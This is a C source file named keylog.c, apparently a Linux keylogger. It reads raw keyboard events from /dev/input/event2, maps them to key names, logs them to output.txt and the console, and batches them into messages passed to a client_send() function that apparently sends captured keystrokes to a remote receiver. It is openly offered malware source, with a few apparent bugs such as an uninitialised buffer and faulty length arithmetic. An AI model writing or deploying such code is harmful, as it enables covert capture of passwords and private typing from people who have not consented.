/*** keylog.c ***/

#include <unistd.h>
#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <stdlib.h>
#include <linux/input.h>
#include "keylog.h"

#define EVENT_NUM 100
#define TOT_KEYS 70

char *keys[] = {
  "KEY_RESERVED",
  "KEY_ESC",
  "KEY_1",
  "KEY_2",
  "KEY_3",
  "KEY_4",
  "KEY_5",
  "KEY_6",
  "KEY_7",
  "KEY_8",
  "KEY_9",
  "KEY_0",
  "KEY_MINUS",
  "KEY_EQUAL",
  "KEY_BACKSPACE",
  "KEY_TAB",
  "KEY_Q",
  "KEY_W",
  "KEY_E",
  "KEY_R",
  "KEY_T",
  "KEY_Y",
  "KEY_U",
  "KEY_I",
  "KEY_O",
  "KEY_P",
  "KEY_LEFTBRACE",
  "KEY_RIGHTBRACE",
  "KEY_ENTER",
  "KEY_LEFTCTRL",
  "KEY_A",
  "KEY_S",
  "KEY_D",
  "KEY_F",
  "KEY_G",
  "KEY_H",
  "KEY_J",
  "KEY_K",
  "KEY_L",
  "KEY_SEMICOLON",
  "KEY_APOSTROPHE",
  "KEY_GRAVE",
  "KEY_LEFTSHIFT",
  "KEY_BACKSLASH",
  "KEY_Z",
  "KEY_X",
  "KEY_C",
  "KEY_V",
  "KEY_B",
  "KEY_N",
  "KEY_M",
  "KEY_COMMA",
  "KEY_DOT",
  "KEY_SLASH",
  "KEY_RIGHTSHIFT",
  "KEY_KPASTERISK",
  "KEY_LEFTALT",
  "KEY_SPACE",
  "KEY_CAPSLOCK",
  "KEY_F1",
  "KEY_F2",
  "KEY_F3",
  "KEY_F4",
  "KEY_F5",
  "KEY_F6",
  "KEY_F7",
  "KEY_F8",
  "KEY_F9",
  "KEY_F10",
  "KEY_NUMLOCK",
  "KEY_SCROLLLOCK"
  };

void safebreak(){
	exit(0);
}

void main()
{
  int count = 0;
  int dif;
  // open output text file to store decoded keystrokes
  FILE *output;
  char message[128];
  output = fopen("output.txt", "w+");

  //open the eventX file that records keystrokes
  //char keyboardPath_EVENTUALLYREPLACE[] = "/dev/input/by-path/platform-i8042-serio-0-event-kbd";
  char keyboardPath_EVENTUALLYREPLACE[] = "/dev/input/event2";
  int device = open(keyboardPath_EVENTUALLYREPLACE, O_RDONLY);
  struct input_event inpEvent;

  // safely break from loop when Ctrl-C is pressed
  signal(SIGINT, safebreak);

  while(1)
  {
    usleep(1000);
    read(device, &inpEvent, sizeof(inpEvent));  
    //if the type of the event is a state change (like of a keyboard)
    if (inpEvent.type == 1 && inpEvent.value == 1)
    {
      //if the event code indicates a standard keyboard button
      if (inpEvent.code > 0 && inpEvent.code <= TOT_KEYS)
      {
	if (strlen(message) + strlen(keys[inpEvent.code]) < 128) 
	{
	  strcat(message, keys[inpEvent.code]);
	}
	else 
	{
	  dif = (strlen(message) + strlen(keys[inpEvent.code])) - 128;
	  strncat(message, keys[inpEvent.code], dif);
 	  client_send(message);
	  strcpy(message, "");
	  strcat(message, keys[inpEvent.code] + dif);
	}

        //output the code of the standard keyboard button
        printf("%s\n", keys[inpEvent.code]);
        fprintf(output, "%s\n", keys[inpEvent.code]);
        count++;
      }
      else
      {
        fprintf(output, "Key not recognized\n");
        printf("Key not recognized\n");
        count++;
      }
    }
  }
  fclose(output);
}
